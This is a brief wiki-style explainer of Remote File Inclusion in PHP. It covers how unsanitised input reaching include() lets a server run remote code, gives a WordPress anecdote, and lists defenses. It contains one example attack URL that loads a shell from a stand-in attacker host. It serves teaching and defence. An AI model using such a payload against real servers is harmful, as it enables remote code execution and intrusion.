# remote file inclusion

## What it is
Imagine a librarian who fetches any book you request — including ones from shady bookstores across town — and reads them aloud to the whole building. Remote File Inclusion (RFI) is a web vulnerability where an application dynamically loads and executes a file from an attacker-controlled external URL, treating hostile remote code as trusted application logic. It occurs when user-supplied input is passed directly into file-loading functions without validation.

## Why it matters
In 2011, attackers exploited RFI vulnerabilities in WordPress plugins to load malicious PHP shells from remote servers, instantly gaining command execution on thousands of hosting accounts. The attacker simply passed a URL like `?page=http://evil.com/shell.php` to the vulnerable parameter, and the server obediently fetched and executed the payload — no exploit kit required, just a browser and a crafted URL.

## Key facts
- RFI requires `allow_url_include = On` in PHP configuration; disabling this single setting neutralizes most PHP-based RFI attacks
- Differs from Local File Inclusion (LFI): RFI pulls code from an external server, LFI reads files already on the target system
- Successful RFI typically leads directly to Remote Code Execution (RCE), making it a critical-severity vulnerability (CVSS scores commonly 9.0+)
- Common vulnerable functions in PHP: `include()`, `require()`, `include_once()`, `require_once()` when fed unsanitized input
- Defense: input whitelisting (only allow expected filenames), disable `allow_url_fopen`/`allow_url_include`, and use Web Application Firewalls (WAF) to block URL-based parameters

## Related concepts
[[local file inclusion]] [[remote code execution]] [[input validation]] [[web application firewall]] [[server-side request forgery]]